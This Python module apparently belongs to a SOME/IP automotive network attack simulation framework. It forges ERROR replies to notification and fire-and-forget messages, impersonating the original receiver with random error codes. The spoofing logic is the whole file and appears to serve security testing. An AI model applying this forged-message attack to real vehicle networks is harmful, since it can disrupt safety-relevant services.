""" Answers with an Error message to a previous Error message. """

import copy
import random

from src import Msg
from src import SomeIPPacket
from src.attacks import AttackerHelper

def sendErrorOnEvent(a, msgOrig):
    """ Attack Specific Function. """
    sender = msgOrig.receiver
    receiver = msgOrig.sender
    timestamp = None

    message = {}

    message['service'] = msgOrig.message['service']
    message['method'] = msgOrig.message['method']
    message['client'] = msgOrig.message['client']
    message['session'] = msgOrig.message['session']
    message['proto'] = SomeIPPacket.VERSION
    message['iface'] = SomeIPPacket.INTERFACE

    message['type'] = SomeIPPacket.messageTypes['ERROR']
    errors = ['E_NOT_OK', 'E_NOT_READY', 'E_NOT_REACHABLE', 'E_TIMEOUT', 'E_MALFORMED_MESSAGE']
    message['ret'] = SomeIPPacket.errorCodes[random.choice(errors)]

    msg = Msg.Msg(sender, receiver, message, timestamp)

    return msg



def doAttack(curAttack, msgOrig, a, attacksSuc):
    """ Generic Function called from Attacker module. """
    RetVal = {}

    if a.verbose:
        print ('Send Error On Event Attack')

    if (msgOrig.message['type'] == SomeIPPacket.messageTypes['NOTIFICATION']) or (msgOrig.message['type'] == SomeIPPacket.messageTypes['REQUEST_NO_RETURN']):
        msg = sendErrorOnEvent(a, msgOrig)
        if a.verbose:
            print ('MALICIOUS MSG: ', msg.message, ' FROM=', msg.sender, ' TO=', msg.receiver)
        RetVal['msg'] = msg
        RetVal['attackOngoing'] = False
        RetVal['dropMsg'] = False
        RetVal['counter'] = attacksSuc + 1

    else:
        RetVal['msg'] = None
        RetVal['attackOngoing'] = True
        RetVal['dropMsg'] = False
        RetVal['counter'] = attacksSuc
    

    return RetVal
    
